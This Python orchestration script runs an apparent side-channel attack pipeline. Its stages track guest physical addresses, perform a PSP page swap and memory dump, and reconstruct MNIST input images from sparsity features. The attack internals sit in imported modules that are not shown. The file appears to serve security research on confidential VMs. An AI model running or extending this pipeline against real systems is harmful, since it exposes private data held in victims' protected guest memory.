#!/usr/bin/env python3
"""
master_orchestrate.py — End-to-End Master Orchestrator for MNIST Side-Channel Pipeline.

Orchestrates all 5 stages:
  Stage 1: Zero GPA Acquisition & Dump (stage1_zero_gpa.py)
  Stage 2: Target Image GPA Tracking (stage2_track_gpa.py)
  Stage 3: PSP Page Swap & Memory Dump (stage3_swap_dump.py)
  Stage 4: Sparsity Feature Vector Extraction (stage4_extract_features.py)
  Stage 5: Multi-Model Reconstruction & Comparison (stage5_reconstruct.py)

Usage:
    sudo python3 master_orchestrate.py --index 30 [--blind] [--output-dir .]
    sudo python3 master_orchestrate.py --start 0 --end 10 [--skip-existing]
    sudo python3 master_orchestrate.py --from-stage 4 --to-stage 5 --index 1000
"""

import argparse
import os
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Set

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import common as c
import stage1_zero_gpa as s1
import stage2_track_gpa as s2
import stage3_swap_dump as s3
import stage4_extract_features as s4
import stage5_reconstruct as s5


def parse_stages(stage_arg: Optional[str], from_stage: Optional[int], to_stage: Optional[int]) -> Set[int]:
    """Determine the active stages to run (set of ints 1..5)."""
    if stage_arg:
        stages = set()
        for part in stage_arg.split(","):
            part = part.strip()
            if "-" in part:
                s, e = part.split("-")
                stages.update(range(int(s), int(e) + 1))
            else:
                stages.add(int(part))
        return {s for s in stages if 1 <= s <= 5}

    start = from_stage if from_stage is not None else 1
    end   = to_stage   if to_stage   is not None else 5
    return {s for s in range(start, end + 1) if 1 <= s <= 5}


def process_single_sample(index: int, active_stages: Set[int], output_dir: Path,
                          args: argparse.Namespace, zero_meta: Optional[Dict]) -> Optional[Dict]:
    """Process a single MNIST sample through the active stages."""
    print(f"\n{'='*70}")
    print(f"  PROCESSING SAMPLE #{index} (Active Stages: {sorted(active_stages)})")
    print(f"{'='*70}")

    sample_t0 = time.time()
    dumps_dir, logs_dir, results_dir = c.get_output_subdirs(output_dir)
    metrics_file = results_dir / f"metrics_{index}.json"
    if not metrics_file.exists():
        metrics_file = output_dir / f"metrics_{index}.json"

    if args.skip_existing and 5 in active_stages and metrics_file.exists():
        print(f"[master] [skip] {metrics_file.name} already exists. Skipping sample #{index}.")
        return c.load_json(metrics_file)

    guest_proc = None
    target_meta = None
    swap_meta = None
    feature_meta = None
    recon_meta = None

    try:
        # ── Stage 2: Target GPA Tracking ─────────────────────────────────
        if 2 in active_stages:
            print(f"\n>>> [Stage 2/5] Tracking Target Image GPA for Index #{index} (bs={args.batch_size})...")
            p2_override = int(args.page2_gpa, 16) if args.page2_gpa else None
            # Keep guest process holding memory if Stage 3 follows
            hold = 3 in active_stages
            target_meta, guest_proc = s2.run_stage2(
                index, output_dir, blind=args.blind,
                batch_size=args.batch_size,
                page2_gpa_override=p2_override, hold_guest=hold,
                duration=args.duration, top_n=args.top_n
            )

        # ── Stage 3: Page Swap & Dump ────────────────────────────────────
        if 3 in active_stages:
            print(f"\n>>> [Stage 3/5] Executing PSP Page Swap & Memory Dump for Index #{index} (bs={args.batch_size})...")
            z_gpa = zero_meta.get("zero_gpa_int") if zero_meta else None
            t_gpa = target_meta.get("image_gpa_int") if target_meta else None
            p2_gpa = target_meta.get("page2_gpa_int") if target_meta else None
            lbl   = target_meta.get("label") if target_meta else args.label

            swap_meta = s3.run_stage3(
                index, output_dir, image_gpa=t_gpa,
                page2_gpa=p2_gpa, zero_gpa=z_gpa, label=lbl,
                batch_size=args.batch_size
            )

            # Once swap & dump is complete, release the guest process
            if guest_proc:
                guest_proc.stdin.close()
                guest_proc.wait(timeout=10)
                guest_proc = None

        # ── Stage 4: Sparsity Extraction ────────────────────────────────
        if 4 in active_stages:
            print(f"\n>>> [Stage 4/5] Extracting Sparsity Feature Vector for Index #{index} (bs={args.batch_size})...")
            lbl = (swap_meta.get("label") if swap_meta else
                   (target_meta.get("label") if target_meta else args.label))
            off = (target_meta.get("pixel_offset") if target_meta else args.pixel_offset)
            j_path = Path(args.json) if args.json else None

            feature_meta = s4.run_stage4(
                index, output_dir, pixel_offset=off,
                label=lbl, json_path=j_path,
                batch_size=args.batch_size,
                clean_dumps=args.clean_dumps
            )

        # ── Stage 5: Multi-Model Reconstruction ─────────────────────────
        if 5 in active_stages:
            print(f"\n>>> [Stage 5/5] Reconstructing Images & Computing SSIM for Index #{index} (bs={args.batch_size})...")
            sp = feature_meta.get("sparsity") if feature_meta else None
            lbl = (feature_meta.get("label") if feature_meta else
                   (target_meta.get("label") if target_meta else args.label))

            recon_meta = s5.run_stage5(index, output_dir, sparsity=sp, label=lbl,
                                       batch_size=args.batch_size)

    finally:
        if guest_proc:
            try:
                guest_proc.stdin.close()
                guest_proc.wait(timeout=5)
            except Exception:
                guest_proc.kill()

    print(f"\n[master] Completed sample #{index} in {time.time() - sample_t0:.2f}s")
    return recon_meta


def print_batch_summary(results: List[Dict]):
    """Print overall summary table for batch execution."""
    if not results:
        return

    valid_results = [r for r in results if r and r.get("metrics")]
    if not valid_results:
        return

    print("\n" + "=" * 78)
    print("  OVERALL PIPELINE BATCH EXECUTION SUMMARY")
    print("=" * 78)
    print(f"  {'Index':<7} | {'Label':<6} | {'v6r SSIM':<14} | {'v9r SSIM':<14} | {'v10 SSIM':<14}")
    print("  " + "-" * 74)

    v6r_scores, v9r_scores, v10_scores = [], [], []

    for r in valid_results:
        idx = r.get("index", "?")
        lbl = r.get("label", "?")
        s6 = r.get("ssim_v6r")
        s9 = r.get("ssim_v9r")
        s10 = r.get("ssim_v10")

        s6_str = f"{s6*100:.2f}%" if s6 is not None else "N/A"
        s9_str = f"{s9*100:.2f}%" if s9 is not None else "N/A"
        s10_str = f"{s10*100:.2f}%" if s10 is not None else "N/A"

        if s6 is not None: v6r_scores.append(s6)
        if s9 is not None: v9r_scores.append(s9)
        if s10 is not None: v10_scores.append(s10)

        print(f"  #{idx:<6} | {str(lbl):<6} | {s6_str:<14} | {s9_str:<14} | {s10_str:<14}")

    print("  " + "-" * 74)
    avg6 = f"{sum(v6r_scores)/len(v6r_scores)*100:.2f}%" if v6r_scores else "N/A"
    avg9 = f"{sum(v9r_scores)/len(v9r_scores)*100:.2f}%" if v9r_scores else "N/A"
    avg10 = f"{sum(v10_scores)/len(v10_scores)*100:.2f}%" if v10_scores else "N/A"
    print(f"  {'AVERAGE':<16} | {avg6:<14} | {avg9:<14} | {avg10:<14}")
    print("=" * 78 + "\n")


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    # Stage selection
    p.add_argument("--stage", default=None, help="Specific stages to run (e.g., '1,2,3,4,5' or '4-5')")
    p.add_argument("--from-stage", type=int, default=None, help="Start stage (1-5)")
    p.add_argument("--to-stage",   type=int, default=None, help="End stage (1-5)")

    # Sample targeting
    p.add_argument("--index", type=int, default=None, help="Single MNIST sample index")
    p.add_argument("--start", type=int, default=None, help="Batch start index (inclusive)")
    p.add_argument("--end",   type=int, default=None, help="Batch end index (inclusive)")
    p.add_argument("--all",   action="store_true", help="Process entire dataset (0-59999)")

    # Execution modes
    p.add_argument("--batch-size", type=int, default=1, help="Batch size (default: 1, e.g. 512 for full batch)")
    p.add_argument("--blind", action="store_true", help="Use host write_pattern_tracker blind candidate detection")
    p.add_argument("--duration", type=int, default=c.DEFAULT_TRACKER_DURATION, help="Blind tracker duration in seconds (default: 120)")
    p.add_argument("--top-n", type=int, default=5, help="Number of blind top candidates to track (default: 5)")
    p.add_argument("--clean-dumps", action="store_true",default=1, help="Auto-delete intermediate .out dump files after feature extraction")
    p.add_argument("--skip-existing", action="store_true", help="Skip already processed samples")
    p.add_argument("--output-dir", default=str(c.DEFAULT_OUTPUT_DIR), help="Output directory for intermediate & final files")

    # Overrides
    p.add_argument("--label", type=int, default=None, help="Explicit label override (0-9)")
    p.add_argument("--zero-gpa", default=None, help="Explicit Zero GPA override (hex)")
    p.add_argument("--page2-gpa", default=None, help="Explicit Page 2 GPA override (hex)")
    p.add_argument("--pixel-offset", type=int, default=None, help="In-page byte offset override")
    p.add_argument("--json", default=None, help="Path to UNet_training_v5.json for ground truth match rate")
    args = p.parse_args()

    active_stages = parse_stages(args.stage, args.from_stage, args.to_stage)
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    print("=" * 70)
    print("  MNIST SIDE-CHANNEL ATTACK PIPELINE (MASTER ORCHESTRATOR)")
    print(f"  Active Stages: {sorted(active_stages)}")
    print(f"  Output Dir   : {output_dir}")
    print(f"  Mode         : {'Blind (write_pattern_tracker)' if args.blind else 'Cooperative / Ground Truth'}")
    print("=" * 70)

    # ── Stage 1: Zero Page Acquisition (Run once upfront if Stage 1 or 3 is active) ─
    zero_meta = None
    z_json_cand = [output_dir / "results" / "zero_gpa.json", output_dir / "zero_gpa.json"]
    has_cached_z = any(p.exists() for p in z_json_cand)

    if 1 in active_stages or (3 in active_stages and not has_cached_z):
        print("\n>>> [Stage 1/5] Acquiring & Caching Zero Page GPA...")
        z_override = int(args.zero_gpa, 16) if args.zero_gpa else None
        zero_meta = s1.run_stage1(output_dir, zero_gpa_override=z_override, force_refresh=(1 in active_stages))
    elif has_cached_z:
        for p in z_json_cand:
            if p.exists():
                zero_meta = c.load_json(p)
                break

    # Determine index list
    if args.index is not None:
        indices = [args.index]
    elif args.all:
        indices = list(range(0, 60000))
    elif args.start is not None or args.end is not None:
        st = args.start if args.start is not None else 0
        en = args.end if args.end is not None else 59999
        indices = list(range(st, en + 1))
    else:
        if any(s in active_stages for s in [2, 3, 4, 5]):
            p.error("Specify target sample via --index N or --start A --end B")
        indices = []

    all_results = []
    t_start = time.time()

    for idx in indices:
        try:
            res = process_single_sample(idx, active_stages, output_dir, args, zero_meta)
            if res:
                all_results.append(res)
        except Exception as e:
            print(f"[master] [!] Error processing sample #{idx}: {e}", file=sys.stderr)

    if len(indices) > 1:
        print_batch_summary(all_results)

    print(f"[master] All tasks finished in {time.time() - t_start:.2f}s.")


if __name__ == "__main__":
    main()
